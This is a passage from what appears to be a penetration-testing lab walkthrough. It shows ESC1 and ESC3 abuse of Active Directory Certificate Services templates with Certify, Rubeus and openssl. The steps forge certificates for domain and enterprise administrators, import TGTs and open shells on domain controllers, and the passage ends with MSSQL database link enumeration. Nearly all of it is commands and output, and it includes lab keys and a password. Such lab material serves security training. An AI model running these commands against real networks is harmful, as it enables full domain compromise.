    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
    Cert Start Date               : 11/26/2022 1:59:16 AM
    Cert End Date                 : 11/26/2032 2:09:15 AM
    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local

[SNIP]

    Enabled Certificate Templates:
        CA-Integration
        HTTPSCertificates
        SmartCardEnrollment-Agent
        SmartCardEnrollment-Users
        DirectoryEmailReplication
        DomainControllerAuthentication
        KerberosAuthentication
        EFSRecovery
        EFS
        DomainController
        WebServer
        Machine
        User
        SubCA
        Administrator

[SNIP]
```

`C:\AD\Tools\Certify.exe find`:
```
[SNIP]

[*] Action: Find certificate templates📌
[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'

[SNIP]

[*] Available Certificates Templates :

[SNIP]

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA🏛️
    Template Name                         : HTTPSCertificates📜
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag           : ENROLLEE_SUPPLIES_SUBJECT📌
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights📌         : dcorp\RDPUsers👥              S-1-5-21-719815819-3726368948-3917688648-1123
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

[SNIP]
```

- **Exploit ESC1 Vulnerability to Request a Certificate for a User with DA Privileges**

`C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject`:
```
[SNIP]

[*] Action: Find certificate templates📌
[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'

[SNIP]

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : HTTPSCertificates📜
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag📌         : ENROLLEE_SUPPLIES_SUBJECT📌
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights📌         : dcorp\RDPUsers👥              S-1-5-21-719815819-3726368948-3917688648-1123
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

[SNIP]
```

`C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator`:
```
[SNIP]

[*] Action: Request a Certificates📌

[*] Current user context    : dcorp\student422
[*] No subject name specified, using current context as subject.

[*] Template                : HTTPSCertificates📜
[*] Subject                 : CN=student422👤, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
[*] AltName                 : administrator🎭

[*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA🏛️

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 32

[*] cert.pem                :

-----BEGIN RSA PRIVATE KEY-----

[SNIP]

-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGYjCCBUqgAwIBAgITFQAAACCuzpyDfVxAaQAAAAAAIDANBgkqhkiG9w0BAQsF
ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNTAyM...

[SNIP]

-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

![ESC1 Certificate  esc1.pem](./assets/screenshots/learning_objective_21_esc1_certificate.png)

- **Use the Obtained Certificate to Request a TGT with DA Privileges**

`C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx`:
```
WARNING: can't open config file: /usr/local/ssl/openssl.cnf
Enter Export Password:
Verifying - Enter Export Password:
unable to write 'random state'
```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:esc1-DA.pfx /password:SecretPass@123 /ptt`:
```
[SNIP]

[*] Action: Ask TGT📌

[*] Got domain: dollarcorp.moneycorp.local
[*] Using PKINIT with etype rc4_hmac and subject: CN=student422, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'dollarcorp.moneycorp.local\administrator'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️

  ServiceName              :  krbtgt📌/dollarcorp.moneycorp.local
  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL🏛️
  UserName                 :  administrator🎭 (NT_PRINCIPAL)
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  2/17/2025 1:19:23 PM
  EndTime                  :  2/17/2025 11:19:23 PM
  RenewTill                :  2/24/2025 1:19:23 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  HFHlvVDv+iG2RzjeC2tWog==
  ASREP (key)              :  5D5C30C91DDA538D4ADA3E2D7D7D27FC

[SNIP]
```

`klist`:
```
Current LogonId is 0:0x38c010

Cached Tickets: (1)

#0>     Client: administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: krbtgt📌/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/17/2025 13:19:23 (local)
        End Time:   2/17/2025 23:19:23 (local)
        Renew Time: 2/24/2025 13:19:23 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

`winrs -r:dcorp-dc cmd /c set username`:
```
USERNAME=Administrator👤
```

- **Exploit ESC1 Vulnerability to Request a Certificate for a User with EA Privileges**

`klist purge`:
```
Current LogonId is 0:0x38c010
        Deleting all tickets:
        Ticket(s) purged!
```

`C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator`:
```
[SNIP]

[*] Action: Request a Certificates📌

[*] Current user context    : dcorp\student422
[*] No subject name specified, using current context as subject.

[*] Template                : HTTPSCertificates📜
[*] Subject                 : CN=student422, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
[*] AltName                 : moneycorp.local\administrator🎭

[*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 34

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----

[SNIP]

-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGcjCCBVqgAwIBAgITFQAAACINEjPjB5sKoQAAAAAAIjANBgkqhkiG9w0BAQsF
ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNTAyM...

[SNIP]

-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

[SNIP]
```

![ESC1 Certificate esc1-EA.pem](./assets/screenshots/learning_objective_21_esc1_ea_certificate.png)

- **Use the Obtained Certificate to Request a TGT with EA Privileges**

`C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-EA.pfx`:
```
WARNING: can't open config file: /usr/local/ssl/openssl.cnf
Enter Export Password:
Verifying - Enter Export Password:
unable to write 'random state'
```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:esc1-EA.pfx /password:SecretPass@123 /ptt`:
```
[SNIP]

[*] Action: Ask TGT📌

[*] Using PKINIT with etype rc4_hmac and subject: CN=student422, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'moneycorp.local\Administrator'
[*] Using domain controller: 172.16.1.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️

  ServiceName              :  krbtgt📌/moneycorp.local
  ServiceRealm             :  MONEYCORP.LOCAL🏛️
  UserName                 :  Administrator🎭 (NT_PRINCIPAL)
  UserRealm                :  MONEYCORP.LOCAL
  StartTime                :  2/17/2025 1:30:37 PM
  EndTime                  :  2/17/2025 11:30:37 PM
  RenewTill                :  2/24/2025 1:30:37 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  XbT8dZ0rQab1GGIVRuAjTw==
  ASREP (key)              :  4156D4E3F1206FA514CBD715C9D07C2F

[SNIP]
```

`klist`:
```
Current LogonId is 0:0x38c010

Cached Tickets: (1)

#0>     Client: Administrator🎭 @ MONEYCORP.LOCAL🏛️
        Server: krbtgt📌/moneycorp.local @ MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/17/2025 13:30:37 (local)
        End Time:   2/17/2025 23:30:37 (local)
        Renew Time: 2/24/2025 13:30:37 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

`winrs -r:mcorp-dc cmd`:
```
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator>
```
🚀

![mcorp-dc | administrator](https://custom-icon-badges.demolab.com/badge/dcorp--dc-administrator-64b5f6?logo=windows11&logoColor=white)

`set username`:
```
USERNAME=Administrator👤
```

`set computername`:
```
COMPUTERNAME=MCORP-DC🖥️
```

`certutil -getreg policy\EditFlags`:
```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\moneycorp-MCORP-DC-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags:

  EditFlags REG_DWORD = 15014e (1376590)
    EDITF_REQUESTEXTENSIONLIST -- 2
    EDITF_DISABLEEXTENSIONLIST -- 4
    EDITF_ADDOLDKEYUSAGE -- 8
    EDITF_BASICCONSTRAINTSCRITICAL -- 40 (64)
    EDITF_ENABLEAKIKEYID -- 100 (256)
    EDITF_ENABLEDEFAULTSMIME -- 10000 (65536)
    EDITF_ATTRIBUTESUBJECTALTNAME2📌 -- 40000 (262144)
    EDITF_ENABLECHASECLIENTDC -- 100000 (1048576)
CertUtil: -getreg command completed successfully.
```
🚩

2. **Exploit ESC3 vulnerable certificate templates to escalate privileges to DA and EA**

- **Find ESC3 Vulnerable Certificate Templates**

`C:\AD\Tools\Certify.exe find /vulnerable`:
```
[SNIP]

[*] Action: Find certificate templates📌
[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'

[SNIP]

[!] Vulnerable Certificates Templates :

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : SmartCardEnrollment-Agent📜
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag           : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage📌                 : Certificate Request Agent📌
    mspki-certificate-application-policy  : Certificate Request Agent
    Permissions
      Enrollment Permissions
        Enrollment Rights📌         : dcorp\Domain Users👥          S-1-5-21-719815819-3726368948-3917688648-513
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

[SNIP]
```

`C:\AD\Tools\Certify.exe find`:
```
[SNIP]

[*] Action: Find certificate templates📌
[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'

[SNIP]

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : SmartCardEnrollment-Users📜
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag           : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 1
    Application Policies📌                : Certificate Request Agent📌
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights📌         : dcorp\Domain Users👥          S-1-5-21-719815819-3726368948-3917688648-513
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

[SNIP]
```

- **Exploit ESC3 Vulnerability to Request a Certificate for a User with DA Privileges**

`C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent`:
```
[SNIP]

[*] Action: Request a Certificates📌

[*] Current user context    : dcorp\student422
[*] No subject name specified, using current context as subject.

[*] Template                : SmartCardEnrollment-Agent📜
[*] Subject                 : CN=student422, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local

[*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 32

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----

[SNIP]

-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGWDCCBUCgAwIBAgITFQAAACAxny5Ez8uQJAAAAAAAIDANBgkqhkiG9w0BAQsF
ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNTAyM...

[SNIP]

-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

[SNIP]
```

![ESC3 Certificate esc3.pem](./assets/screenshots/learning_objective_21_esc3_certificate.png)

`C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3.pfx`:
```
WARNING: can't open config file: /usr/local/ssl/openssl.cnf
Enter Export Password:
Verifying - Enter Export Password:
unable to write 'random state'
```

`C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:C:\AD\Tools\esc3.pfx /enrollcertpw:SecretPass@123`:
```
[SNIP]

[*] Action: Request a Certificates📌

[*] Current user context    : dcorp\student422

[*] Template                : SmartCardEnrollment-Users📜
[*] On Behalf Of            : dcorp🏛️\administrator🎭

[*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA🏛️

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 33

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----

[SNIP]

-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGiTCCBXGgAwIBAgITFQAAACFm4hRI9tagOwAAAAAAITANBgkqhkiG9w0BAQsF
ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNTAyM...

[SNIP]

-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

[SNIP]
```

![ESC3 Certificate esc3-DA.pem](./assets/screenshots/learning_objective_21_esc3_da_certificate.png)

- **Use the Obtained Certificate to Request a TGT with DA Privileges**

`C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-DA.pfx`:
```
WARNING: can't open config file: /usr/local/ssl/openssl.cnf
Enter Export Password:
Verifying - Enter Export Password:
unable to write 'random state'
```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:esc3-DA.pfx /password:SecretPass@123 /ptt`:
```
[SNIP]

[*] Action: Ask TGT📌

[*] Got domain: dollarcorp.moneycorp.local
[*] Using PKINIT with etype rc4_hmac and subject: CN=Administrator, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'dollarcorp.moneycorp.local\administrator'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️

  ServiceName              :  krbtgt📌/dollarcorp.moneycorp.local
  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL🏛️
  UserName                 :  administrator🎭 (NT_PRINCIPAL)
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  2/18/2025 12:31:10 AM
  EndTime                  :  2/18/2025 10:31:10 AM
  RenewTill                :  2/25/2025 12:31:10 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  B6A5vSxiatauhFIxWrj4Fg==
  ASREP (key)              :  AB019B2EBA2BAB2CA9AA4435E6D2A3BC
```

`klist`:
```
Current LogonId is 0:0x38c010

Cached Tickets: (1)

#0>     Client: administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: krbtgt📌/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/18/2025 0:31:10 (local)
        End Time:   2/18/2025 10:31:10 (local)
        Renew Time: 2/25/2025 0:31:10 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

`winrs -r:dcorp-dc cmd /c set username`:
```
USERNAME=Administrator👤
```

- **Exploit ESC3 Vulnerability to Request a Certificate for a User with EA Privileges**

`C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:mcorp\administrator /enrollcert:C:\AD\Tools\esc3.pfx /enrollcertpw:SecretPass@123`:
```
[SNIP]

[*] Action: Request a Certificates📌

[*] Current user context    : dcorp\student422

[*] Template                : SmartCardEnrollment-Users📜
[*] On Behalf Of            : mcorp🏛️\administrator🎭

[*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA🏛️

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 35

[*] cert.pem         :

[SNIP]

-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGYTCCBUmgAwIBAgITFQAAACMCMsil8oByjwAAAAAAIzANBgkqhkiG9w0BAQsF
ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNTAyM...

[SNIP]

-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

[SNIP]
```

![ESC3 Certificate esc3-EA.pem](./assets/screenshots/learning_objective_21_esc3_ea_certificate.png)

- **Use the Obtained Certificate to Request a TGT with EA Privileges**

`C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-EA.pfx`:
```
WARNING: can't open config file: /usr/local/ssl/openssl.cnf
Enter Export Password:
Verifying - Enter Export Password:
unable to write 'random state'
```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\administrator /certificate:C:\AD\Tools\esc3-EA.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt`:
```
[SNIP]

[*] Action: Ask TGT📌

[*] Using PKINIT with etype rc4_hmac and subject: CN=Administrator, CN=Users, DC=moneycorp, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'moneycorp.local\administrator'
[*] Using domain controller: 172.16.1.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️

  ServiceName              :  krbtgt📌/moneycorp.local
  ServiceRealm             :  MONEYCORP.LOCAL🏛️
  UserName                 :  administrator🎭 (NT_PRINCIPAL)
  UserRealm                :  MONEYCORP.LOCAL
  StartTime                :  2/18/2025 12:46:35 AM
  EndTime                  :  2/18/2025 10:46:35 AM
  RenewTill                :  2/25/2025 12:46:35 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  3M6YyJFE9vZov9XvIVttYw==
  ASREP (key)              :  FC0AB6D59B241E284B57F1FAB400CF9A
```

`klist`:
```
Current LogonId is 0:0x38c010

Cached Tickets: (1)

#0>     Client: administrator🎭 @ MONEYCORP.LOCAL🏛️
        Server: krbtgt📌/moneycorp.local @ MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/18/2025 0:46:35 (local)
        End Time:   2/18/2025 10:46:35 (local)
        Renew Time: 2/25/2025 0:46:35 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

`winrs -r:mcorp-dc cmd /c set username`:
```
USERNAME=Administrator👑
```
🚩

#### Cross Trust Attacks | MSSQL Database Links Abuse (with PowerUpSQL, Invoke-PowerShellTcpEx)

- **Find a Target SQL Server where we have Connection Privileges**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerUpSQL-master\PowerUpSQL.psd1`

`Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose`:
```
VERBOSE: dcorp-mgmt.dollarcorp.moneycorp.local,1433 : Connection Failed.
VERBOSE: dcorp-mgmt.dollarcorp.moneycorp.local : Connection Failed.
VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local,1433 : Connection Success.📌
VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.📌
VERBOSE: dcorp-sql1.dollarcorp.moneycorp.local,1433 : Connection Failed.
VERBOSE: dcorp-sql1.dollarcorp.moneycorp.local : Connection Failed.

ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local
Instance               : DCORP-MSSQL🖥️
DomainName             : dcorp🏛️
ServiceProcessID       : 1892
ServiceName            : MSSQLSERVER🗄️
ServiceAccount         : NT AUTHORITY\NETWORKSERVICE
AuthenticationMode     : Windows and SQL Server Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 15.0.2000.5
SQLServerMajorVersion  : 2019
SQLServerEdition       : Developer Edition (64-bit)
SQLServerServicePack   : RTM
OSArchitecture         : X64
OsVersionNumber        : SQL
Currentlogin           : dcorp\student422👤
IsSysadmin             : No
ActiveSessions         : 1
```

- **Find the existing Database Links from the Target SQL Server**

`Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose`:
```
VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
VERBOSE: --------------------------------
VERBOSE:  Server: DCORP-MSSQL🖥️
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: DCORP-MSSQL
VERBOSE:  - Link Login: dcorp\student422
VERBOSE:  - Link IsSysAdmin: 0
VERBOSE:  - Link Count: 1
VERBOSE:  - Links on this server: DCORP-SQL1
VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
VERBOSE: --------------------------------
VERBOSE:  Server: DCORP-SQL1🖥️
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: DCORP-MSSQL -> DCORP-SQL1
VERBOSE:  - Link Login: dblinkuser
VERBOSE:  - Link IsSysAdmin: 0
VERBOSE:  - Link Count: 1
VERBOSE:  - Links on this server: DCORP-MGMT
VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
